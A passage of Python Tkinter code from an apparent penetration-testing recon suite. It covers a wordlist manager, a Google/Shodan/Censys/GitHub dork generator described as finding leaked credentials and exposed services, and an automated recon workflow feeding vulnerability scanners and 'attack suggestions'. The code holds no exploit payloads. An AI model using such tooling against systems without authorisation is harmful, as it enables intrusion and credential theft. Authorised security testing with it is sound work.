            self.poc_cvss.set(str(self._last_cvss["score"]))
            self.poc_vector.set(self._last_cvss["vector"])
            self._goto_tab("Exploitation"); self.set_status("CVSS sent to PoC Builder!", GREEN)

    # ═════════════════════════════════════════════════════════════
    #  WORDLISTS
    # ═════════════════════════════════════════════════════════════
    def _build_wordlists(self, frame):
        """Full wordlist manager — GitHub Dark style."""
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2)
        pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "WORDLIST MANAGER — Kali / SecLists / Custom", "📂").pack(fill='x', pady=(0,8))

        info = mk_card(pad, accent_top=True, accent_color=ACCENT)
        info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Scans /usr/share/wordlists  ·  /usr/share/seclists  ·  /usr/share/dirb  ·  /usr/share/dirbuster\n"
            "  Shows all available wordlists with line count and file size\n"
            "  Double-click = copy path  ·  Preview button = view first 500 lines"
        ), bg=BG2, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        # Filter bar
        fr = mk_frame(pad, bg=BG2); fr.pack(fill='x', pady=(0,8))
        tk.Label(fr, text="🔍", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._wl_search_var = tk.StringVar()
        se = mk_entry(fr, var=self._wl_search_var, w=26)
        se.pack(side='left', padx=6, ipady=3)
        self._wl_search_var.trace_add('write', lambda *_: self.root.after(200, self._wl_filter_tree))
        tk.Label(fr, text=" Type:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._wl_type_var = tk.StringVar(value="All")
        for lbl, val, clr in [("All","All",FG2),("Built-in","built-in",ACCENT),
                               ("Kali/SecLists","system",GREEN),("Custom","custom",YELLOW)]:
            ttk.Radiobutton(fr, text=lbl, variable=self._wl_type_var, value=val, command=self._wl_filter_tree).pack(side='left', padx=5)
        self._wl_count_lbl = tk.Label(fr, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._wl_count_lbl.pack(side='left', padx=10)

        # Tree
        cols = ('Category','Name','Lines','Size','Path')
        self._wl_tree = mk_tree(pad, columns=cols, show='headings', height=20)
        wsz = {'Category':110,'Name':220,'Lines':80,'Size':65,'Path':420}
        for c in cols:
            self._wl_tree.heading(c, text=c, anchor='w',
                command=lambda _c=c: self._wl_sort_by(_c))
            self._wl_tree.column(c, width=wsz.get(c,100), anchor='w')
        self._wl_tree.tag_configure('built-in', foreground=ACCENT,  background=BG3)
        self._wl_tree.tag_configure('system',   foreground=GREEN,   background=BG3)
        self._wl_tree.tag_configure('custom',   foreground=YELLOW,  background=BG3)
        self._wl_tree.tag_configure('missing',  foreground=FG3,     background=BG3)
        self._wl_tree.tag_configure('default',  foreground=FG,      background=BG3)
        vsb_wl = ttk.Scrollbar(pad, orient='vertical',   command=self._wl_tree.yview)
        hsb_wl = ttk.Scrollbar(pad, orient='horizontal',  command=self._wl_tree.xview)
        self._wl_tree.configure(yscrollcommand=vsb_wl.set, xscrollcommand=hsb_wl.set)
        tf2 = mk_frame(pad, bg=BG2); tf2.pack(fill='both', expand=True)
        self._wl_tree.pack(side='left', fill='both', expand=True, in_=tf2)
        vsb_wl.pack(side='right', fill='y', in_=tf2)
        hsb_wl.pack(side='bottom', fill='x')
        self._wl_tree.bind('<Double-1>', self._wl_copy_path)
        self._wl_tree.bind('<Return>',   self._wl_copy_path)

        # Detail label
        det = mk_card(pad); det.pack(fill='x', pady=(6,0))
        det_f = mk_frame(det, bg=BG2); det_f.pack(fill='x', padx=12, pady=6)
        self._wl_detail_lbl = tk.Label(det_f, text="Double-click = copy path",
                                       bg=BG2, fg=FG3, font=MONO_S)
        self._wl_detail_lbl.pack(anchor='w')

        # Buttons
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))

        def _refresh(full=False):
            self._wl_data = list_wordlists(include_system_scan=full)
            self._wl_filter_tree()
            self.set_status(f"Wordlists: {sum(1 for v in self._wl_data.values() if v.get('exists'))} available", GREEN)

        def _import_wl():
            name = simpledialog.askstring("Import","Name:", parent=self.root)
            if not name: return
            path = filedialog.askopenfilename(filetypes=[("Text","*.txt *.lst"),("All","*.*")])
            if not path: return
            with open(path, encoding='utf-8', errors='replace') as f2: content = f2.read()
            save_custom_wordlist(name, content); _refresh()
            self.set_status(f"Imported: {name}", GREEN)

        def _merge_wl():
            paths = filedialog.askopenfilenames(filetypes=[("Text","*.txt *.lst"),("All","*.*")])
            if not paths: return
            name = simpledialog.askstring("Merge","Output name:", parent=self.root)
            if not name: return
            merge_wordlists(list(paths), name); _refresh()

        def _copy_sel():
            sel = self._wl_tree.selection()
            if not sel: return
            vals = self._wl_tree.item(sel[0])['values']
            if not vals: return
            path = str(vals[4])
            self.root.clipboard_clear(); self.root.clipboard_append(path); self.root.update()
            self._wl_detail_lbl.config(text=f"📋 Copied: {path}", fg=GREEN)
            self.set_status(f"Copied: {path}", GREEN)

        def _preview():
            sel = self._wl_tree.selection()
            if not sel: return
            vals = self._wl_tree.item(sel[0])['values']
            if not vals: return
            path = str(vals[4])
            if not os.path.isfile(path): return
            win = tk.Toplevel(self.root)
            win.title(f"Preview — {os.path.basename(path)}")
            win.configure(bg=BG); win.geometry("680x480"); win.lift()
            tk.Frame(win, bg=ACCENT, height=2).pack(fill='x')
            tk.Label(win, text=f"  {path}", bg=BG, fg=FG3, font=MONO_S).pack(anchor='w', padx=8, pady=4)
            ptxt = mk_stext(win, h=24)
            ptxt.pack(fill='both', expand=True, padx=8, pady=4)
            ptxt.config(state='normal')
            try:
                with open(path, encoding='utf-8', errors='replace') as f2:
                    for i, line in enumerate(f2):
                        if i >= 500: ptxt.insert('end', "\n... (first 500 lines shown)"); break
                        ptxt.insert('end', line)
            except Exception as e:
                ptxt.insert('end', f"Error: {e}")
            ptxt.config(state='disabled')

        for lbl2, cmd2, clr2 in [
            ("🔄 Refresh",     lambda: _refresh(False),  FG2),
            ("🔍 Deep Scan",   lambda: _refresh(True),   ACCENT),
            ("📥 Import",      _import_wl,                GREEN),
            ("⊕  Merge",       _merge_wl,                 CYAN),
            ("📋 Copy Path",   _copy_sel,                 YELLOW),
            ("👁 Preview",     _preview,                  PURPLE),
            ("📂 Folder",      lambda: open_folder(str(WORDLISTS)), FG3),
        ]:
            mk_btn(bf, lbl2, cmd2, clr2, small=True).pack(side='left', padx=3)

        self._wl_data     = {}
        self._wl_sort_col = 'Category'
        self._wl_sort_rev = False
        _refresh(False)

    def _wl_filter_tree(self):
        if not hasattr(self,'_wl_tree'): return
        search  = self._wl_search_var.get().strip().lower() if hasattr(self,'_wl_search_var') else ""
        typ_flt = self._wl_type_var.get() if hasattr(self,'_wl_type_var') else "All"
        data    = getattr(self,'_wl_data',{})
        col     = getattr(self,'_wl_sort_col','Category')
        rev     = getattr(self,'_wl_sort_rev',False)
        self._wl_tree.delete(*self._wl_tree.get_children())
        sort_key = {
            'Category': lambda kv: kv[1].get('type',''),
            'Name':     lambda kv: kv[0].lower(),
            'Lines':    lambda kv: kv[1].get('lines',0),
            'Size':     lambda kv: kv[1].get('size',''),
            'Path':     lambda kv: kv[1].get('path',''),
        }.get(col, lambda kv: kv[0].lower())
        items = sorted(data.items(), key=sort_key, reverse=rev)
        shown = 0
        for name, info in items:
            typ    = info.get('type','')
            path   = info.get('path','')
            exists = info.get('exists',False)
            lines  = info.get('lines',0)
            size   = info.get('size','—')
            if typ_flt != "All" and typ != typ_flt: continue
            if search and search not in name.lower() and search not in path.lower(): continue
            cat = {"built-in":"📦 Built-in","system":"🐉 Kali/SecLists",
                    "custom":"✏️ Custom"}.get(typ, typ)
            tag = typ if exists else 'missing'
            lines_str = f"{lines:,}" if lines else ("—" if not exists else "?")
            self._wl_tree.insert('','end', values=(cat, name, lines_str, size, path), tags=(tag,))
            shown += 1
        avail = sum(1 for v in data.values() if v.get('exists'))
        if hasattr(self,'_wl_count_lbl'):
            self._wl_count_lbl.config(text=f"Showing: {shown}  ·  Available: {avail}  ·  Total: {len(data)}")

    def _wl_sort_by(self, col):
        if getattr(self,'_wl_sort_col','') == col:
            self._wl_sort_rev = not getattr(self,'_wl_sort_rev',False)
        else:
            self._wl_sort_col = col; self._wl_sort_rev = False
        self._wl_filter_tree()

    def _wl_copy_path(self, _e=None):
        sel = self._wl_tree.selection()
        if not sel: return
        vals = self._wl_tree.item(sel[0])['values']
        if not vals: return
        path = str(vals[4])
        self.root.clipboard_clear(); self.root.clipboard_append(path); self.root.update()
        if hasattr(self,'_wl_detail_lbl'):
            self._wl_detail_lbl.config(text=f"📋 {path}", fg=GREEN)
        self.set_status(f"Copied: {path}", GREEN)


    def _build_dorks(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        # Engine tabs
        engines = [
            ("🔍 Google",  "google",  YELLOW),
            ("📡 Shodan",  "shodan",  RED),
            ("🔭 Censys",  "censys",  CYAN),
            ("🐙 GitHub",  "github",  PURPLE),
        ]
        for title, engine, color in engines:
            ef = tk.Frame(nb2, bg=BG2); nb2.add(ef, text=f"  {title}  ")
            self._build_dork_engine_panel(ef, engine, color)

        # NEW: Dork Runner tab
        rf = tk.Frame(nb2, bg=BG2); nb2.add(rf, text="  🚀 Dork Runner  ")
        self._build_dork_runner(rf)

    def _build_dork_engine_panel(self, frame, engine: str, accent_color: str):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)

        ENGINE_INFO = {
            "google": ("Google Dork Generator", "Uses Google advanced search operators to find sensitive info",
                       dorks_module.GOOGLE_DORK_CATEGORIES, dorks_module.build_google_url),
            "shodan": ("Shodan Dork Generator",  "Query Shodan for exposed services and infrastructure",
                       dorks_module.SHODAN_DORK_CATEGORIES, dorks_module.build_shodan_url),
            "censys": ("Censys Dork Generator",  "Search Censys internet-wide scan data for exposed hosts",
                       dorks_module.CENSYS_DORK_CATEGORIES, dorks_module.build_censys_url),
            "github": ("GitHub Dork Generator",  "Find leaked credentials and sensitive code on GitHub",
                       dorks_module.GITHUB_DORK_CATEGORIES, dorks_module.build_github_url),
        }
        title, desc, cat_dict, url_builder = ENGINE_INFO[engine]

        # Header info
        hf = mk_card(pad); hf.pack(fill='x', pady=(0,12))
        hff = mk_frame(hf, bg=BG3); hff.pack(fill='x', padx=14, pady=10)
        tk.Label(hff, text=title, bg=BG3, fg=accent_color, font=MONO_B).pack(side='left')
        counts = dorks_module.count_total_dorks()
        tk.Label(hff, text=f"  {counts.get(engine,0)} dorks loaded",
                 bg=BG3, fg=FG3, font=MONO_S).pack(side='left', padx=12)
        tk.Label(hff, text=desc, bg=BG3, fg=FG2, font=MONO_S).pack(side='right')

        # Target + category row
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,10))
        tk.Label(tr, text="TARGET:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        dork_target = tk.StringVar(value=self.project.get() or "example.com")
        mk_entry(tr, var=dork_target, w=30).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: dork_target.set(self.project.get()), FG3, small=True).pack(side='left')

        # Auto-save status label
        self._dork_save_lbl = tk.Label(tr, text="", bg=BG2, fg=GREEN, font=MONO_S)
        self._dork_save_lbl.pack(side='left', padx=10)

        def _auto_save_dorks(*_):
            """Auto-save all 4 engine dork files when target changes."""
            t = dork_target.get().strip()
            if not t or t == "example.com" or len(t) < 4: return
            proj     = self.project.get() or t
            proj_dir = LOGS_DIR / proj
            try:
                saved = dorks_module.save_dorks_for_target(t, proj_dir)
                count  = dorks_module.count_total_dorks()
                total  = sum(count.values())
                self._dork_save_lbl.config(
                    text=f"✅ {total} dorks saved → logs/{proj}/dorks_*.txt", fg=GREEN)
                self.set_status(f"Dorks saved: {total} total for {t}", GREEN)
            except Exception as e:
                self._dork_save_lbl.config(text=f"⚠ Save failed: {e}", fg=RED)

        dork_target.trace_add('write', lambda *_: self.root.after(800, _auto_save_dorks))
        mk_btn(tr, "💾 Save Dorks Now", _auto_save_dorks, CYAN, small=True).pack(side='left', padx=4)

        tk.Label(tr, text="CATEGORY:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(16,4))
        cat_var = tk.StringVar(value="All")
        cat_cb  = ttk.Combobox(tr, textvariable=cat_var,
                                values=["All"] + list(cat_dict.keys()), width=28, font=MONO_S)
        cat_cb.pack(side='left', padx=8)

        # Main pane: category tree (left) + dork list (right)
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True, pady=(0,8))

        # Category tree
        left_f = mk_frame(paned, bg=BG2); paned.add(left_f, width=200)
        cat_tree = mk_tree(left_f, columns=('cat','count'), show='headings', height=24)
        cat_tree.heading('cat', text='Category'); cat_tree.column('cat', width=140)
        cat_tree.heading('count', text='#');     cat_tree.column('count', width=40)
        vsb_c = ttk.Scrollbar(left_f, orient='vertical', command=cat_tree.yview)
        cat_tree.configure(yscrollcommand=vsb_c.set)
        cat_tree.pack(side='left', fill='both', expand=True)
        vsb_c.pack(side='right', fill='y')

        # Dork list
        right_f = mk_frame(paned, bg=BG2); paned.add(right_f, stretch='always')
        dork_cols = ('#', 'Dork')
        dork_tree = mk_tree(right_f, columns=dork_cols, show='headings', height=24)
        dork_tree.heading('#', text='#');         dork_tree.column('#', width=40)
        dork_tree.heading('Dork', text='Dork Query'); dork_tree.column('Dork', width=700)
        vsb_d = ttk.Scrollbar(right_f, orient='vertical', command=dork_tree.yview)
        hsb_d = ttk.Scrollbar(right_f, orient='horizontal', command=dork_tree.xview)
        dork_tree.configure(yscrollcommand=vsb_d.set, xscrollcommand=hsb_d.set)
        dork_tree.pack(side='left', fill='both', expand=True)
        vsb_d.pack(side='right', fill='y')

        # Populate category tree
        for cat_name, dork_list in cat_dict.items():
            cat_tree.insert('', 'end', iid=cat_name, values=(cat_name, len(dork_list)))

        def load_category(event=None):
            sel = cat_tree.selection()
            cat = sel[0] if sel else None
            target = dork_target.get().strip() or "example.com"
            dork_tree.delete(*dork_tree.get_children())
            if cat and cat in cat_dict:
                items = [d.replace("{target}", target) for d in cat_dict[cat]]
            else:
                items = dorks_module.get_all_dorks_flat(engine, target)
            for i, d in enumerate(items, 1):
                dork_tree.insert('', 'end', iid=f"d{i}", values=(i, d))

        cat_tree.bind("<<TreeviewSelect>>", load_category)
        dork_target.trace_add('write', lambda *_: load_category())
        load_category()

        # Action buttons
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(0,4))

        def open_selected():
            sel = dork_tree.selection()
            if not sel: return
            for iid in sel[:5]:  # max 5 tabs at once
                dork = dork_tree.item(iid)['values'][1]
                url  = url_builder(str(dork))
                webbrowser.open(url)
                self.set_status(f"Opened: {dork[:60]}...", accent_color)

        def open_all_category():
            sel_cat = cat_tree.selection()
            if not sel_cat:
                messagebox.showwarning("No Category", "Select a category first.", parent=self.root); return
            cat = sel_cat[0]
            target = dork_target.get().strip() or "example.com"
            dorks_list = [d.replace("{target}", target) for d in cat_dict.get(cat, [])]
            if len(dorks_list) > 10:
                if not messagebox.askyesno("Confirm", f"Open {len(dorks_list)} browser tabs?", parent=self.root): return
            for d in dorks_list:
                webbrowser.open(url_builder(d))
            self.set_status(f"Opened {len(dorks_list)} dorks", GREEN)

        def copy_selected():
            sel = dork_tree.selection()
            if not sel: return
            lines = [str(dork_tree.item(iid)['values'][1]) for iid in sel]
            self.root.clipboard_clear(); self.root.clipboard_append("\n".join(lines))
            self.set_status(f"{len(lines)} dork(s) copied!", GREEN)

        def copy_all():
            target = dork_target.get().strip() or "example.com"
            all_dorks = dorks_module.get_all_dorks_flat(engine, target)
            self.root.clipboard_clear(); self.root.clipboard_append("\n".join(all_dorks))
            self.set_status(f"{len(all_dorks)} dorks copied!", GREEN)

        def export_all():
            from tkinter import filedialog
            target = dork_target.get().strip() or "example.com"
            path = filedialog.asksaveasfilename(
                defaultextension=".txt",
                initialfile=f"{target}_{engine}_dorks.txt",
                filetypes=[("Text","*.txt"),("All","*.*")])
            if path:
                all_dorks = dorks_module.get_all_dorks_flat(engine, target)
                with open(path, 'w') as f:
                    f.write(f"# {engine.upper()} DORKS — Target: {target}\n")
                    f.write(f"# Generated by TeamCyberOps Suite v3\n\n")
                    f.write("\n".join(all_dorks))
                self.set_status(f"Exported {len(all_dorks)} dorks → {path}", GREEN)

        def export_all_engines():
            from tkinter import filedialog
            target = dork_target.get().strip() or "example.com"
            path = filedialog.asksaveasfilename(
                defaultextension=".txt",
                initialfile=f"{target}_all_dorks.txt",
                filetypes=[("Text","*.txt"),("All","*.*")])
            if path:
                out_path = dorks_module.export_dorks_txt(target, path)
                self.set_status(f"All dorks exported → {out_path}", GREEN)

        def open_in_browser():
            """Open selected dork in browser — guaranteed working."""
            sel = dork_tree.selection()
            if not sel:
                # If nothing selected, open first 3 in current view
                all_items = dork_tree.get_children()
                sel = all_items[:3]
            count = 0
            for iid in list(sel)[:8]:
                vals = dork_tree.item(iid)['values']
                if not vals: continue
                dork = str(vals[1])
                url  = url_builder(dork)
                try:
                    webbrowser.open(url)
                    count += 1
                except Exception as e:
                    pass
            self.set_status(f"Opened {count} dork(s) in browser", accent_color)

        def run_shodan_api():
            """Run Shodan dork via API if key is configured."""
            if engine != "shodan": return
            sel = dork_tree.selection()
            if not sel: return
            dork = str(dork_tree.item(list(sel)[0])['values'][1])
            api_key = load_cfg()["api_keys"].get("shodan","")
            if not api_key:
                messagebox.showwarning("No API Key","Add Shodan API key in Settings → API Keys.", parent=self.root)
                webbrowser.open(dorks_module.build_shodan_url(dork))
                return
            cmd = ["shodan","search","--fields","ip_str,port,hostnames,org",dork]
            if hasattr(self,'recon_term') and self.recon_term:
                self.recon_term.run_command(cmd, label=f"Shodan: {dork[:50]}")
                self._goto_tab("Auto-Recon")
            else:
                webbrowser.open(dorks_module.build_shodan_url(dork))

        def run_github_api():
            """Search GitHub via gh CLI or browser."""
            if engine != "github": return
            sel = dork_tree.selection()
            if not sel: return
            dork = str(dork_tree.item(list(sel)[0])['values'][1])
            import shutil
            if shutil.which("gh"):
                cmd = ["gh","search","code",dork,"--limit","20"]
                if hasattr(self,'recon_term') and self.recon_term:
                    self.recon_term.run_command(cmd, label=f"GitHub: {dork[:50]}")
                    self._goto_tab("Auto-Recon")
            else:
                webbrowser.open(dorks_module.build_github_url(dork))

        def copy_as_curl():
            """Copy selected dork as working curl/API command."""
            sel = dork_tree.selection()
            if not sel:
                all_items = dork_tree.get_children()
                if not all_items:
                    self.set_status("Select a dork first!", RED); return
                sel = (all_items[0],)
            dork   = str(dork_tree.item(sel[0])['values'][1])
            cfg2   = load_cfg()
            if engine == "shodan":
                api_key = cfg2.get("api_keys",{}).get("shodan","YOUR_SHODAN_KEY")
                cmd_str = (f'curl -sk "https://api.shodan.io/shodan/host/search'
                           f'?key={api_key}&query={urllib.parse.quote(dork)}&minify=true"'
                           f' | python3 -m json.tool')
            elif engine == "censys":
                cid = cfg2.get("api_keys",{}).get("censys_id","API_ID")
                cs  = cfg2.get("api_keys",{}).get("censys_secret","API_SECRET")
                cmd_str = (f'curl -sk -u "{cid}:{cs}" '
                           f'"https://search.censys.io/api/v2/hosts/search" '
                           f'-H "Content-Type: application/json" '
                           f"-d '" + '{"q":"' + dork + '","per_page":25}' + "' | python3 -m json.tool")
            elif engine == "github":
                token = cfg2.get("api_keys",{}).get("github_token","")
                if token:
                    cmd_str = (f'curl -sk -H "Authorization: token {token}" '
                               f'"https://api.github.com/search/code?q={urllib.parse.quote(dork)}&per_page=30"'
                               f' | python3 -m json.tool')
                else:
                    cmd_str = f'gh search code "{dork}" --limit 30 --json path,repository,url'
            else:
                google_url = dorks_module.build_google_url(dork)
                cmd_str = f'# Google Dork URL:\n{google_url}\n\n# Open in browser:\nstart "" "{google_url}"'
            # Copy to clipboard
            try:
                self.root.clipboard_clear()
                self.root.clipboard_append(cmd_str)
                self.root.update()
                self.set_status(f"✅ Copied! ({engine.upper()} command)", GREEN)
            except Exception as e:
                self.set_status(f"Clipboard error: {e}", RED)
            # Show popup
            win = tk.Toplevel(self.root)
            win.title(f"Command — {engine.upper()}")
            win.configure(bg=BG2); win.geometry("760x260")
            win.lift(); win.focus_force()
            tk.Label(win, text=f"Engine: {engine.upper()}  |  Dork: {dork[:55]}",
                     bg=BG2, fg=ACCENT, font=MONO_S).pack(padx=14, pady=(10,2), anchor='w')
            tk.Label(win, text="✅ Copied to clipboard! Select text below to copy manually:",
                     bg=BG2, fg=GREEN, font=MONO_S).pack(padx=14, pady=(0,4), anchor='w')
            cmd_txt = tk.Text(win, height=7, bg=BG3, fg=GREEN, font=MONO_S,
                              relief='flat', wrap='none', insertbackground=ACCENT)
            cmd_txt.pack(fill='both', expand=True, padx=14)
            cmd_txt.insert('end', cmd_str)
            # Horizontal scrollbar
            hsb = ttk.Scrollbar(win, orient='horizontal', command=cmd_txt.xview)
            cmd_txt.configure(xscrollcommand=hsb.set); hsb.pack(fill='x', padx=14)
            bf_pop = mk_frame(win, bg=BG2); bf_pop.pack(fill='x', padx=14, pady=6)
            def _copy_again():
                self.root.clipboard_clear(); self.root.clipboard_append(cmd_str)
                self.root.update(); self.set_status("Copied again!", GREEN)
            def _run_and_close():
                win.destroy()
                term = getattr(self, 'url_term', None) or getattr(self, 'recon_term', None)
                if term:
                    term.run_command(shell_cmd(cmd_str), label=f"Dork {engine}")
                    self._goto_tab("URL Discovery")
                else:
                    self.set_status("Open URL Discovery tab first", RED)
            mk_btn(bf_pop, "📋 Copy Again", _copy_again, ACCENT, small=True).pack(side='left', padx=4)
            mk_btn(bf_pop, "▶ Run in Terminal", _run_and_close, GREEN, small=True).pack(side='left', padx=4)
            mk_btn(bf_pop, "✕ Close", win.destroy, FG3, small=True).pack(side='right', padx=4)

        def run_in_terminal():
            sel = dork_tree.selection()
            if not sel:
                all_items = dork_tree.get_children()
                if not all_items: return
                sel = (all_items[0],)
            dork = str(dork_tree.item(sel[0])['values'][1])
            cfg2 = load_cfg()
            if engine == "shodan":
                if shutil.which("shodan"):
                    cmd_str = f"shodan search --fields ip_str,port,hostnames,org '{dork}'"
                else:
                    api_key = cfg2.get("api_keys",{}).get("shodan","")
                    cmd_str = (f'curl -sk "https://api.shodan.io/shodan/host/search'
                               f'?key={api_key}&query={urllib.parse.quote(dork)}&minify=true"'
                               f' | python3 -m json.tool')
                label = f"Shodan: {dork[:40]}"
            elif engine == "github":
                if shutil.which("gh"):
                    cmd_str = f'gh search code "{dork}" --limit 30 --json path,repository,url'
                else:
                    token = cfg2.get("api_keys",{}).get("github_token","")
                    if token:
                        cmd_str = (f'curl -sk -H "Authorization: token {token}" '
                                   f'"https://api.github.com/search/code?q={urllib.parse.quote(dork)}&per_page=30"'
                                   f' | python3 -m json.tool')
                    else:
                        webbrowser.open(f"https://github.com/search?q={urllib.parse.quote(dork)}&type=code")
                        self.set_status("gh CLI not found — opened browser", YELLOW); return
                label = f"GitHub: {dork[:40]}"
            elif engine == "censys":
                cid = cfg2.get("api_keys",{}).get("censys_id","")
                cs  = cfg2.get("api_keys",{}).get("censys_secret","")
                if cid and cs:
                    cmd_str = (f'curl -sk -u "{cid}:{cs}" '
                               f'"https://search.censys.io/api/v2/hosts/search" '
                               f'-H "Content-Type: application/json" '
                               f"-d '" + '{"q":"' + dork + '","per_page":25}' + "' | python3 -m json.tool")
                else:
                    webbrowser.open(dorks_module.build_censys_url(dork))
                    self.set_status("Censys keys not set — opened browser", YELLOW); return
                label = f"Censys: {dork[:40]}"
            else:
                webbrowser.open(dorks_module.build_google_url(dork))
                self.set_status("Google dork opened in browser", GREEN); return
            term = getattr(self, 'url_term', None) or getattr(self, 'recon_term', None)
            if term:
                term.run_command(shell_cmd(cmd_str), label=label)
                self._goto_tab("URL Discovery")
                self.set_status(f"Running: {label}", accent_color)
            else:
                webbrowser.open(url_builder(dork))

        row1 = mk_frame(bf, bg=BG2); row1.pack(fill='x', pady=(0,4))
        row2 = mk_frame(bf, bg=BG2); row2.pack(fill='x', pady=(0,4))
        for txt, cmd, clr, row in [
            ("🌐 Open in Browser",     open_in_browser,    accent_color, row1),
            ("▶▶ Open Category",      open_all_category,  YELLOW,       row1),
            ("📋 Copy Selected",       copy_selected,      GREEN,        row1),
            ("📋 Copy All Dorks",      copy_all,           FG2,          row1),
            ("💾 Export This Engine",  export_all,         ACCENT,       row2),
            ("💾 Export All Engines",  export_all_engines, PURPLE,       row2),
            ("🔌 Run via API/CLI",     run_shodan_api if engine=="shodan" else run_github_api if engine=="github" else open_in_browser, ORANGE, row2),
            ("📟 Copy as CURL",        copy_as_curl,       CYAN,         row2),
        ]:
            mk_btn(row, txt, cmd, clr, small=True).pack(side='left', padx=4)

        row3 = mk_frame(bf, bg=BG2); row3.pack(fill='x', pady=(0,4))
        mk_btn(row3, "🖥 Run in Terminal (Shodan/GitHub CLI)", run_in_terminal, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(row3, "🌍 Open All in Browser", lambda: [webbrowser.open(url_builder(str(dork_tree.item(i)['values'][1]))) for i in list(dork_tree.get_children())[:5]], YELLOW, small=True).pack(side='left', padx=4)

        # Stats footer
        sf = mk_frame(pad, bg=BG2); sf.pack(fill='x', pady=(4,0))
        counts = dorks_module.count_total_dorks()
        for eng, count in counts.items():
            clr = {"google":YELLOW,"shodan":RED,"censys":CYAN,"github":PURPLE}.get(eng, FG2)
            tk.Label(sf, text=f"{eng.upper()}: {count}",
                     bg=BG2, fg=clr, font=(_MONO_FACE,9)).pack(side='left', padx=10)

    # ═════════════════════════════════════════════════════════════

    # ═════════════════════════════════════════════════════════════
    #  SMART RECON — Automated Workflow
    # ═════════════════════════════════════════════════════════════
    def _build_smart_recon(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        wf = tk.Frame(nb2, bg=BG2); nb2.add(wf, text="  🔄 Workflow  ")
        af = tk.Frame(nb2, bg=BG2); nb2.add(af, text="  🎯 Attack Suggestions  ")
        sf = tk.Frame(nb2, bg=BG2); nb2.add(sf, text="  📊 Surface Summary  ")
        self._build_workflow_panel(wf)
        self._build_attack_suggestions(af)
        self._build_surface_summary(sf)
        self._sr_nb = nb2

    def _build_workflow_panel(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        # Target row
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,10))
        tk.Label(tr, text="TARGET:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._sr_target = tk.StringVar(value=self.project.get() or "")
        mk_entry(tr, var=self._sr_target, w=36).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self._sr_target.set(self.project.get()), FG3, small=True).pack(side='left')
        mk_btn(tr, "▶▶ Run Full Smart Recon", self._run_full_smart_recon, YELLOW).pack(side='right', padx=4)

        # Phase info
        phases_card = mk_card(pad); phases_card.pack(fill='x', pady=(0,12))
        pf = mk_frame(phases_card, bg=BG3); pf.pack(fill='x', padx=14, pady=10)
        phases = [
            ("Phase 1", "Passive Recon", "GitHub/Google/Shodan dorks + Subfinder + Amass + crt.sh", YELLOW),
            ("Phase 2", "DNS Resolution", "DNSx bulk resolve all subdomains", CYAN),
            ("Phase 3", "HTTP + Tech", "httpx probe + auto tech-stack file splitting", GREEN),
            ("Phase 4", "URL Discovery", "GAU + Waybackurls + Katana + param extraction", ACCENT),
            ("Phase 5", "Vuln Scan", "Nuclei + Dalfox + GF SQLi patterns + Subzy takeover", RED),
            ("Phase 6", "AI Analysis", "Intelligent attack suggestions per tech stack", PURPLE),
        ]
        for code, name, desc, clr in phases:
            row = mk_frame(pf, bg=BG3); row.pack(fill='x', pady=3)
            tk.Label(row, text=f"[{code}]", bg=BG3, fg=clr, font=(_MONO_FACE,9,'bold'), width=10).pack(side='left')
            tk.Label(row, text=f"{name}: ", bg=BG3, fg=FG, font=MONO_B, width=18).pack(side='left')
            tk.Label(row, text=desc, bg=BG3, fg=FG2, font=MONO_S).pack(side='left')

        # Step-by-step run
        mk_section(pad, "STEP-BY-STEP EXECUTION", "⚡").pack(fill='x', pady=(8,6))
        self._sr_steps_frame = mk_frame(pad, bg=BG2); self._sr_steps_frame.pack(fill='x', pady=(0,10))
        self._sr_step_labels = {}
        self._build_step_buttons()

        # Terminal
        self._sr_term = Terminal(pad, height=14, title="SMART RECON TERMINAL")
        self._sr_term.pack(fill='both', expand=True)

    def _build_step_buttons(self):
        for w in self._sr_steps_frame.winfo_children(): w.destroy()
        target = self._sr_target.get() or "TARGET"
        proj   = self.project.get() or "default"
        steps  = smart_recon.build_smart_recon_commands(target, proj)
        cols   = 3
        for i, (label, cmd, desc) in enumerate(steps):
            r, c = divmod(i, cols)
            card = mk_card(self._sr_steps_frame)
            card.grid(row=r, column=c, padx=4, pady=4, sticky='nsew')
            self._sr_steps_frame.columnconfigure(c, weight=1)
            tk.Label(card, text=label, bg=BG3, fg=ACCENT, font=('Consolas',8,'bold')).pack(pady=(8,2), padx=8, anchor='w')
            tk.Label(card, text=desc, bg=BG3, fg=FG3, font=('Consolas',7), wraplength=200).pack(padx=8, anchor='w')
            _cmd = cmd; _lbl = label
            mk_btn(card, "▶ Run", lambda c=_cmd, l=_lbl: self._sr_term.run_command(c, label=l),
                   GREEN, small=True).pack(pady=(4,8), padx=8, anchor='w')

    def _run_full_smart_recon(self):
        target = self._sr_target.get().strip()
        if not target:
            messagebox.showwarning("No Target","Enter a target domain.", parent=self.root); return
        proj  = self.project.get() or "default"
        steps = smart_recon.build_smart_recon_commands(target, proj)
        self._sr_term.log(f"[*] SMART RECON STARTING — {target}", 'warn')
